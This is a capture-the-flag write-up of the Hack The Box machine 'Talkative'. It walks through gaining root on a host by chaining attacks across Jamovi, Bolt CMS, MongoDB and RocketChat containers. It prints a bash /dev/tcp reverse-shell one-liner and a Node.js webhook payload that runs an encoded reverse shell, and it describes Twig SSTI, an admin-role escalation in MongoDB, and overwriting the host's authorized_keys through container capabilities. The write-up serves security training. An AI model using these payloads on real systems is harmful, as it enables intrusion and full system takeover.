---
layout: post
title:  "HTB Writeup [Linux - Hard] - Talkative"
published: false
---

![](/assets/Talkative/Talkative.png)

## Summary
- **Talkative** is a **Linux** box with a **long chain of exploitation** that went ***through several containers*** to finally crack the host.
- The **intial foothold** is through **an analytics web app** called **Jamovi** that was on **port 8080**. It had a **plugin called "RJ Editor"** which allowed us to **run system commands** using **the R language.**
- ***With an R reverse shell,*** we **got on that application's container** as `root`.
- We attempted to **break out of it** and **get on the host** but couldn't find a way to do that.
- *In that docker's* `/root` *directory,* we **found an archive** called `Bolt-Administration` which **contained 3 sets of credentials.**
- We **reused the passwords** we found on the **Bolt CMS instance** on **port 80** and **could log in** as `admin`
- *Because Bolt CMS used the* **Twig PHP template engine**, we were able to **abuse it** to **obtain RCE** via **Server-Side Template Injection (SSTI).**
- We got a shell as `www-data` within **the Bolt container**. *And from it,* we could `SSH` to the host **using the credentials we found** (port 22 was filtered from the outside).
- *On the host,* we **uploaded a standalone version of** `nmap` and did a **full port scan** on **all the hosted docker instances.**
- **One of the containers** had **port 27017 open** which is the **default port for MongoDB.**
- We set up `chisel` to **forward any connections** from our Kali to that port. And **could access the Mongo database** *through the tunnel* ***without authentication***.
- *While checking Mongo,* we **found the database for RocketChat** which we could alter.
- *To abuse it,* we **registered a user** through the RocketChat web application and **changed our role to** `admin` with a NoSQL update statement.
- We could **obtain RCE** through the app by **creating an Integration** for an **incoming web hook** that **ran server-side JavaScript** when triggered.
- *After getting* ***a reverse shell on the RocketChat container*** *as* `root`, we **installed a few dependencies** to **detect dangerous capabilities.**
- We found the `cap_dac_read_search` and `cap_dac_override` capabilities and **exploited them** to **write an SSH public key** over the host's `/root/.ssh/authorized_keys` file then **used the private key to SSH to it** as `root`.

---

## NMAP
```
# Nmap 7.92 scan initiated Thu Sep  8 05:52:25 2022 as: nmap -sC -sV --version-all -oN 10.10.11.155-full-scan.nmap -p 22,80,3000,8080,8081,8082 10.10.11.155
Nmap scan report for talkative (10.10.11.155)
Host is up (0.12s latency).

PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
80/tcp   open     http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://talkative.htb
|_http-server-header: Apache/2.4.52 (Debian)
3000/tcp open     ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: Bcy5tmWBNwCAATRnA
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Thu, 08 Sep 2022 09:52:38 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta name="apple-mobile-web-app-capable" conten
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: Bcy5tmWBNwCAATRnA
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Thu, 08 Sep 2022 09:52:39 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta name="apple-mobile-web-app-capable" conten
|   Help, NCP: 
|_    HTTP/1.1 400 Bad Request
8080/tcp open     http    Tornado httpd 5.0
|_http-title: jamovi
|_http-server-header: TornadoServer/5.0
8081/tcp open     http    Tornado httpd 5.0
|_http-title: 404: Not Found
|_http-server-header: TornadoServer/5.0
8082/tcp open     http    Tornado httpd 5.0
|_http-title: 404: Not Found
|_http-server-header: TornadoServer/5.0
```

`nmap` gives us **a lot of ports** to check out: **80, 3000 and 8080 through 8082**. **SSH** is there but *filtered* which suggest it's closed off by a firewall or something.

- **Port 80** redirects to `http://talkative.htb` so we have **a host name** to add to our `/etc/hosts` file and we might want to **search for other vhosts.**
- **Port 3000** seems to be a **web application.**
- **Port 8080** has **Jamovi** as a title which seems interesting.
- **Ports 8081 and 8082** give a `404 - Not Found`. there might be more to them.
- *And Lastly,* **all 808X ports** are hosted on a **different type of web server** called **"Tornado httpd"** with a version of 5.0 (we could check if it's vulnerble)

## Checking Out Port 80
*After modifying the* `/etc/hosts` *file with the* `talkative.htb` *hostname*, we visit the website:

![](/assets/Talkative/Port-80-wappalyzer.jpg)

**Wappalyzer** shows us it's running **Bolt CMS** and **PHP as its server-side language**. Good to know.

we also find a **list of usernames** there:

![](/assets/Talkative/port-80-usernames-and-links.jpg)

each user's **"Read More"** link takes us to **another page with his email in it**:

![](/assets/Talkative/janit-user-mail.jpg)

we get 3 usernames/emails:

1. **Janit Smith** [janit@talkative.htb]
2. **Saul Goodman** [saul@talkative.htb]
3. **Matt Williams** [matt@talkative.htb]

*Down at the bottom,* we also find **references to 3 products**

![](/assets/Talkative/port-80-products.jpg)

### 1. TALKZONE
the first one was *a bit vague*

![](/assets/Talkative/port-80-talkzone.jpg)

### 2. TALKFORBIZ (Coming Soon)

this one talked about an application called **"RocketChat"** where it's **free to register** an account.

![](/assets/Talkative/port-80-talkforbiz-rocket-chat-hint.jpg)

### 3. TALK-A-STATS (Coming Soon)

**Jamovi** is mentioned here as well as **a link to it.**

![](/assets/Talkative/port-80-talkastats.jpg)

*But apart from that,* **there wasn't much here** to played with. So we moved on..

## Checking Port 3000

*Over port 3000,* we found **the homepage for RocketChat**. It indeed **allowed registration** as mentioned above.

![](/assets/Talkative/port-3000-rocket-registration.jpg)

We **could register** with `test@talkative.htb`. Trying other domains like `@test.com` didn't work.

The **"Channels"** area had one channel: **"#general"**. There wasn't any information there.

![](/assets/Talkative/port-3000-empty-chat.jpg)

*Before diving any deeper here, ex:* ***fingerprinting the web app's version*** *and* *searching for exploits,* we decided to first **take a quick look on Jamovi**.

## The Jamovi Web App and Container

The home page had **an indicator of a vulnerability.**

![](/assets/Talkative/jamovi-first-look.jpg)

*On the toolbar above,* there was **an "R" icon** which had a drop-down menu. It had something called **"RJ Editor".**

![](/assets/Talkative/jamovi-rj-editor.jpg)

*When checking it out,* it seemed like **a web console** where we could **run code.**

![](/assets/Talkative/jamovi-rj-editor-code.jpg)

**"R"** is a **programming language** commonly used for **statistics-related stuff**. ***But can we abuse it?***

we searched **Google** for **"r reverse shell"**

![](/assets/Talkative/search-r-reverse-shell.jpg)

and found this [Github gist](https://gist.github.com/trietptm/05f385df4d2d8c0ee35b217e7307e462) as the first result

![](/assets/Talkative/r-reverse-shell-gist.jpg)

it got us **a shell** as `root`

![](/assets/Talkative/jamovi-container-rooted.jpg)

*the first thing we noticed after getting in,* was **being in a container.**

we could tell from the `.dockerenv` file in the system root.

![](/assets/Talkative/jamovi-container.jpg)

### Finding Creds in the Root User's Directory

*In* `/root`, we found **an interesting file:** `bolt-administration.omv`

![](/assets/Talkative/jamovi-container-root-dir.jpg)

*But since the* `unzip` *utility wasn't there on the docker,* we used a **bash trick** -*commonly-used in reverse shells*- to **transfer it back** to our Kali.

![](/assets/Talkative/file-transfer-without-nc.jpg)

*Having* ***verified the file's integrity*** *using* `md5sum`, we **unzipped the archive**.

![](/assets/Talkative/unzipping-bolt-archive.jpg)

the `xdata.json` file within had the ***kind of loot we were looking for :D***

![](/assets/Talkative/bolt-archive-loot.jpg)

*from the file's name,* we know that **the creds inside should work for Bolt.**

*but before taking that route,* we must first do **a couple of important checks.**

### Check #1: Scanning our Subnet and Attempting to Reach the Host

we need to **discover the Container Environment** and see if we can **reach the host** spawning our docker.

*if the host* ***exposed its SSH port*** *to our container,* we could try **reusing the creds** we found there.

we will first **get our docker's IP** using `hostname -i`

![](/assets/Talkative/jamovi-container-ip.jpg)

we're at `172.18.0.2`.

*Usually,* the host **holds the first IP** on the subnet (*here,* that would be `172.18.0.1`).

*To confirm this,* we needed either `ping` or `ssh`. but ***neither was available :/***

![](/assets/Talkative/jamovi-container-no-ping-no-ssh-client.jpg)

A **handy tool** here would be `nmap`. we're going to upload a [Standalone Binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) for it to our container.

*For the transfer,* we used the **same bash tricks** as earlier but *in the opposite direction* this time.

![](/assets/Talkative/jamovi-container-transfer-nmap.jpg)

we ran **a quick network discovery** with `-sn` and **increased the rate** with `--min-rate` and `-T4` for speed

![](/assets/Talkative/jamovi-container-network-discovery.jpg)

we **only found** the `172.18.0.1` host up.

*Next,* we ran a **full port scan** against it.

*but to do that,* `nmap` needed a file (`/etc/services`) that was missing.

that file **was there on our Kali**. so we got it and re-ran `nmap`.

![](/assets/Talkative/jamovi-container-no-ssh-to-host.jpg)

the **SSH port was filtered**. ***Still worth it though :)***

the **remaining ports** were *already exposed from outside*. so we moved on..

### Check #2: Attempting to Escape our Container

*Because we had the* `root` *privilege*, it was also worth it to run a tool like [deepce.sh](https://github.com/stealthcopter/deepce) to **try and break out of our docker onto the host.**

![](/assets/Talkative/jamovi-deepce-sh.jpg)

The **capability** we found: `cap_dac_override` wasn't dangerous on its own.

It required the `cap_dac_read_search` with it to ***enable a Docker escape.***

*Having* **checked the above shorcuts** *and found them closed,* we can now ***safely pay Bolt a visit without looking back :)***

## Reusing Creds on Bolt and Exploiting it for RCE

*To find bolt's login page,* we **searched Google:** "bolt admin login".

we found the [Official Documentation Page](https://docs.boltcms.io/5.0/manual/login)

*according to it,* the `/bolt` web directory **contains the login page.**

![](/assets/Talkative/bolt-login-page.jpg)

Trying **all the usernames** and **emails** with **all the passwords** didn't get us in.

*However,* trying the `admin` username worked with `jeO09ufhWD<s` (`matt`*'s password*).

*Looking around for RCE venues,* we tried to **upload a PHP reverse shell** since Bolt ran it server-side.

But **that file type wasn't allowed.**

![](/assets/Talkative/bolt-fail-to-upload-php.jpg)

And **editing the config file** wasn't an option either.

![](/assets/Talkative/bolt-cant-edit-config-file.jpg)

*However, since the* `.twig` *file extension was allowed,* we had a chance to **execute code** through **Server-Side Template Injection (SSTI).**

*because* **Twig** *is a* **template engine for PHP**, it essentially **enables us to run server-side code.**

*To proceed,* we went to **"File Management"** > **"View & edit templates"**

![](/assets/Talkative/bolt-view-edit-templates.jpg)

We **chose the "base-2021" theme** since it was the one *likely in use* then selected `index.twig` for editing.

![](/assets/Talkative/bolt-index-twig-writable.jpg)

*it looked writable,* so we next **inserted a standard SSTI payload** from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#twig) Github Repo

![](/assets/Talkative/bolt-basic-ssti-payload.jpg)

*After saving,* this payload was **expected to reflect** on the home page.

But that **change didn't take effect** until we **"Cleared the Cache"** from the option under the **"Maintenance"** section.

![](/assets/Talkative/bolt-clear-the-cache-feature.jpg)

the **number 49** appeared at the **top right corner** of the page.

![](/assets/Talkative/bolt-ssti-execution-confirmed.jpg)

*Having* ***confirmed code execution,*** we switched to a **base64-encoded bash reverse shell** payload:

![](/assets/Talkative/bolt-ssti-bash-reverse-shell.jpg)

**which is**:

```bash
bash -i >& /dev/tcp/10.10.16.9/9000 0>&1
```

*with another cache clear and a visit to the home page,* we **get back a shell** as `www-data`

![](/assets/Talkative/bolt-ssti-shell-access.jpg)

## Enumerating the 2nd Container Subnet and Reaching the Host

**Listing the contents of the system root** showed us we were now in **another Docker container** but with a **different IP** of `172.17.0.13`

![](/assets/Talkative/bolt-docker-ip.jpg)

This was a **different subnet** from the **Jamovi** container's (`172.18.0.0/24`).

***to discover this area,*** we're going to do **the same thing as before:** use `nmap`

![](/assets/Talkative/bolt-docker-getting-nmap.jpg)

*after transferring it,* we run **a host discovery** over the `172.17.0.0/24` subnet

![](/assets/Talkative/bolt-docker-nmap-discovery.jpg)

we found **a LOT of live devices** there (*from* `172.17.0.1` *all the way up to* `172.17.0.19`)

we've been wanting to **try the creds** we found **on the host's SSH port**. *But it was always filtered.*

*However, on this container,* we found the **SSH client installed** which was interesting.

we tried to **connect to the host** as `root`:

![](/assets/Talkative/bolt-docker-try-ssh-to-host.jpg)

*After a couple of tries,* the **set of creds** that worked were:
```
saul
jeO09ufhWD
```

![](/assets/Talkative/ssh-as-saul.jpg)

## Finding RocketChat's MongoDB Instance and Altering it

*Trying to privesc,* we ran [linpeas](https://github.com/carlospolop/PEASS-ng) here. But we **didn't find a way** to `root`.

*but, when looking at* **the system processes,** we noticed **plenty of docker instances** running:

![](/assets/Talkative/host-enumerating-docker-processes.jpg)

- **Most of the ports** were 80.
- There was **one for 3000** which was **probably RocketChat**. A container we haven't touched.
- There were **other high ports** that we wanted to check.

***But to be sure we weren't missing any other ports,*** we uploaded `nmap` a 3rd time and ran a **full port scan** over the entire `172.17.0.2-19` IP range.

And we **did find something very interesting.**

![](/assets/Talkative/host-mongo-db-discovered.jpg)

**Port 27017** is the **default port for MongoDB**. which is **known for having no authentication** *by default.*

*to reach that port on the* `172.17.0.2` *host,* we will need **some Port Forwarding magic.**

[Chisel](https://github.com/jpillora/chisel) is a **nice choice** for its **ease-of-use**.

we **upload it** to the bolt container and **create a tunnel to Mongo.**

![](/assets/Talkative/tunneling-and-reaching-mongodb.jpg)

*Having authenticated without any credentials,* we could **enumerate the database**

```bash
# listing the databases
show dbs
# using the meteor database
use meteor
# showing collections within the meteor db (equivaled to tables in MySQL)
show collections
```

*among the various collections,* we found one called **"users"** which had interesting stuff:

![](/assets/Talkative/saul-rockechat-user.jpg)

we noticed `saul`'s account, which **had an admin role.**

***Trying to compromise it,*** we:
1. **tried to login** using the **passwords we found earlier.** none worked.
2. we also tried **cracking the bcrypt hash**. but without any luck.
3. we **replaced that bcrypt hash** with one of our own. *still, for some reason,* **that change didn't reflect.**
4. we even **used his ID and token as cookies** to impersonate him. but, **that also didn't work** :/

![](/assets/Talkative/using-saul-cookies-for-impersonation.jpg)

***so, instead,*** we chose to **update our user's role** in the database to **grant him admin privileges :D**

we ran the **NoSQL update statement** below to carry this out.

```javascript
db.users.update({ _id : "voBu5qYu5ye3vDcw7"}, {
	$set: { 
		roles: ["admin"]
	}
})
```

![](/assets/Talkative/mongo-grant-admin-role.jpg)

it **ran without problems**. we confirmed this with another query.

![](/assets/Talkative/mongo-admin-role-granted.jpg)

*after relogging,* we could now **access RocketChat's administrator interface** at `/admin`

![](/assets/Talkative/rocket-chat-logged-in-as-admin.jpg)

*Noticing the version,* we **searched for exploits** but *didn't get any results.*

## Exploiting RocketChat Integrations for RCE
*While searching* ***Google*** *for ways to* ***execute code using RocketChat's admin,*** we came across a **couple of results.**

![](/assets/Talkative/rocket-chat-search-admin-rce.jpg)

*Checking the one on* [Exploit-DB](https://www.exploit-db.com/exploits/50108), We **looked closely** at the `rce` **function** within the **Python code.**

it seemed that **RochetChat's Integration feature** was **being abused** to **run Javascript code server-side**. This is how **Remote Code Execution** was obtained.

![](/assets/Talkative/rocket-chat-rce-exploit-analysis.jpg)

*following the exploit's way of creating its payload,* we **created our own Integration** and **Incoming Web Hook** to **execute a bash reverse shell** instead of the `cmd` variable above.

**Here's the code:**

```javascript
const require = console.log.constructor('return process.mainModule.require')();
const { exec } = require('child_process');
exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDAgMD4mMQ== | base64 -d | bash');
```

![](/assets/Talkative/rocket-chat-incoming-webhook-setup.jpg)

*After* ***filling out all the fields*** *similar to what the exploit did,* we **saved the changes.**

we then **copied** the `curl` command

![](/assets/Talkative/rocket-chat-obtaining-the-webhook-url.jpg)

and used it to **trigger the webhook** after starting our `ncat` listener in advance.

![](/assets/Talkative/rocket-chat-curling-the-webhook-url.jpg)

we got a **sweet** `root` **shell** on the **RocketChat container :D**

## Escaping and Owning the Host (Finally)
*After getting in,* we **improved our shell** using the `script` utility to **get a pty.**

![](/assets/Talkative/rocket-chat-container-improving-the-shell.jpg)

we then **transfered** the `deepce.sh` script and **ran it** to **check for ways to escape to the host.**

*because the* `capsh` *tool wasn't installed,* the script **couldn't enumerate the docker's capabilities.**

![](/assets/Talkative/rocket-container-no-capsh-installed.jpg)

*since* ***capabilities are one of the main ways to escape containers,*** we **had to install the missing items.**

we `cat` the `/etc/os-release` file to **get our Linux distro.**

![](/assets/Talkative/rocket-container-linux-distro.jpg)

we were on **Debian 10.** so we searched **Google** to find out how to install `capsh`

The **first result** was from a website called [command-not-found.com](https://command-not-found.com/capsh). such ***a suitable name :)***

![](/assets/Talkative/rocket-container-finding-capsh-dependencies-1.jpg)

*according to it,* we needed the `libcap2-bin` library.

we **could obtain it** from the [Debain packages](https://packages.debian.org/sid/amd64/libcap2-bin/download) site

*but during installation,* it **required another library**: `libcap2`

![](/assets/Talkative/rocket-container-finding-capsh-dependencies-2.jpg)

we got it the same way from [here](https://packages.debian.org/sid/amd64/libcap2/download) and installed it using `dpkg -i`

***having installed the required dependencies,*** we ran `deepce.sh` a second time:

![](/assets/Talkative/rocket-chat-container-capabilities-discovered.jpg)

we found a **set of critical capabilities**. Namely `cap_dac_read_search` and `cap_dac_override` which **together can be exploited to write files to the host machine.**

We're going to **follow the method explained** in the [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override) page and **compile the C code.**

**Note:** ***staticly linking the binary*** with the `-static` flag will **make sure it has the libraries** it needs.

![](/assets/Talkative/privesc-compile-shocker-write.jpg)

the **warnings weren't a concern** here. we still **got the compiled executable.**

*To compromise the host,* we first **generated an SSH key pair.**

![](/assets/Talkative/privesc-generating-ssh-key-pair.jpg)

we then **transferred the public key** and **used the exploit** to **write it over** the host's `/root/.ssh/authorized_keys` file.

![](/assets/Talkative/privesc-writing-ssh-public-key-to-host.jpg)

**which was a success!**

The **final step** was to **transfer the private key to the bolt container** (*since it had the* `ssh` *client installed*) and use it to **own the box.**

![](/assets/Talkative/privesc-rooted-finally.jpg)

**What a trip! :D**